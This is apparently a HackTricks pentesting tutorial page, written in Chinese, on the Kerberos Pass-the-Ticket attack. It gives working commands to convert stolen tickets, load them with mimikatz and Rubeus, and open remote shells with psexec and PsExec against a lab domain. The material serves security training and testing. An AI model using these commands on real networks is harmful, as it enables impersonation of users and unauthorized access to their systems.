# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

在 **Pass The Ticket (PTT)** 攻击方法中，攻击者会**窃取用户的身份验证票据**，而不是其密码或哈希值。随后，攻击者使用窃取的票据**冒充该用户**，从而未经授权访问网络中的资源和服务。<sup>[[1]](#references)</sup>

**阅读**：

- [从 Windows 获取票据](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [从 Linux 获取票据](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **在 Linux 和 Windows 平台之间交换票据**

[**ticket_converter**](https://github.com/Zer1t0/ticket_converter) 工具仅使用票据本身和输出文件即可转换票据格式。
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
在 Windows 中可以使用 [Kekeo](https://github.com/gentilkiwi/kekeo)。

### Pass The Ticket Attack
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## 参考资料

- [1] [Kerberos（II）：如何攻击 Kerberos？](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
